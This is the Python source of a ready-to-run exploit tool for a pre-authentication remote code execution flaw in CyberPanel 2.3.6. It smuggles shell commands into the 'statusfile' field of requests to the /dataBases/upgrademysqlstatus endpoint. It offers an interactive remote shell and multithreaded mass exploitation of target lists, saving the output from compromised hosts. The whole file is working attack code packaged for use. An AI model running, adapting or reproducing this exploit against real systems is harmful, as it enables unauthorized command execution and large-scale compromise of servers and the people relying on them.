import sys
import json
import random
import logging
import urllib3
import requests
import rich_click as click

from typing import Optional, List
from alive_progress import alive_bar
from colorlog import ColoredFormatter
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

click.rich_click.USE_MARKDOWN = True

LOG_LEVEL = logging.DEBUG
LOGFORMAT = (
    "  %(log_color)s%(levelname)-8s%(reset)s | %(log_color)s%(message)s%(reset)s"
)
formatter = ColoredFormatter(LOGFORMAT)
stream = logging.StreamHandler()
stream.setLevel(LOG_LEVEL)
stream.setFormatter(formatter)

log = logging.getLogger("CyberPanelExploit")
log.setLevel(LOG_LEVEL)
log.addHandler(stream)


class CyberPanel:
    def __init__(self, target: str):
        self.target = target
        self.session = requests.Session()

    def execute_command(self, command: str, interactive: bool = False) -> Optional[str]:
        headers = {"Content-Type": "application/json", "Referer": self.target}

        payload = {"statusfile": f"/dev/null; {command}; #"}

        try:
            response = self.session.options(
                f"{self.target}/dataBases/upgrademysqlstatus",
                headers=headers,
                json=payload,
                verify=False,
                timeout=10,
            )

            response_text = response.text
            try:
                response_data = json.loads(response_text)
                result = response_data.get("requestStatus")
            except json.JSONDecodeError:
                log.error("Failed to parse response as JSON")
                result = None

            if interactive:
                return result
            else:
                if result is not None:
                    log.info(f"{self.target}: {result.rstrip()}")
                    return result

        except requests.Timeout:
            log.error(f"Request timed out for target {self.target}")
            return None
        except Exception as e:
            log.error(f"Error executing command on {self.target}: {e}")
            return None

    def interactive_shell(self):
        session = PromptSession(history=InMemoryHistory())
        log.info("Interactive shell started. Type 'exit' to quit.")

        color_options = ["red", "green", "yellow", "blue", "magenta", "cyan"]
        while True:
            color = random.choice(color_options)
            cmd = session.prompt(HTML(f"<ansi{color}><b># </b></ansi{color}>")).strip()

            if cmd.lower() == "exit":
                log.info("Exiting shell...")
                break
            elif cmd.lower() == "clear":
                sys.stdout.write("\x1b[2J\x1b[H")
                continue

            output = self.execute_command(cmd, interactive=True)
            if output:
                print(output)
            else:
                log.warning("Failed to receive response from the server.")


def run_exploit_on_targets(
    targets: List[str], command: str, output_file: Optional[str], threads: int
) -> None:
    with alive_bar(
        len(targets), title="Scanning Targets", bar="smooth", enrich_print=False
    ) as bar:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(CyberPanel(target).execute_command, command): target
                for target in targets
            }

            for future in as_completed(futures):
                target = futures[future]
                try:
                    result = future.result()
                    if result:
                        log.info(f"{target}: {result.rstrip()}")
                        if output_file:
                            with open(output_file, "a") as f:
                                f.write(f"{target}: {result}\n")
                except Exception as e:
                    log.error(f"Error with target {target}: {e}")
                bar()


@click.command(
    help="""
CyberPanel v2.3.6 Pre-Auth RCE Exploit Tool

This tool exploits a Remote Code Execution (RCE) vulnerability in CyberPanel version 2.3.6. The vulnerability is located in the /dataBases/upgrademysqlstatus endpoint, which fails to properly sanitize the 'statusfile' parameter. By injecting commands into this parameter, an attacker can gain unauthorized access and execute arbitrary commands on the target server.

Examples:

- Single target URL interactively
    
    - `python exploit.py -u http://example.org`
  
- Single target URL with specific command
  
    - `python exploit.py -u http://example.org "id"`

- Multiple targets from a file and save results
  
    - `python exploit.py -f targets.txt -o results.txt -t 10 "uname -a"`
               
"""
)
@click.option("-u", "--url", help="Specify a single target URL.")
@click.option(
    "-f",
    "--file",
    type=click.Path(exists=True),
    help="Provide a file with a list of target URLs.",
)
@click.option(
    "-o", "--output", type=click.Path(), help="File to save the output results."
)
@click.option(
    "-t",
    "--threads",
    default=100,
    show_default=True,
    help="Number of concurrent threads.",
)
@click.argument("command", default="id")
def main(
    url: Optional[str],
    file: Optional[str],
    output: Optional[str],
    threads: int,
    command: Optional[str],
) -> None:
    if not (url or file):
        log.error("Please specify a target URL (-u) or a file with targets (-f).")
        return

    if url:
        exploit = CyberPanel(url)
        output = (
            exploit.execute_command(command, interactive=True)
            if command
            else exploit.interactive_shell()
        )
        if output:
            log.info(output)
        return

    targets = load_targets_from_file(file)
    if not targets:
        log.error("No valid targets found in file.")
        return

    log.info(f"Starting exploitation on {len(targets)} targets with {threads} threads.")
    run_exploit_on_targets(targets, command, output, threads)


def load_targets_from_file(filepath: str) -> List[str]:
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]


if __name__ == "__main__":
    main()
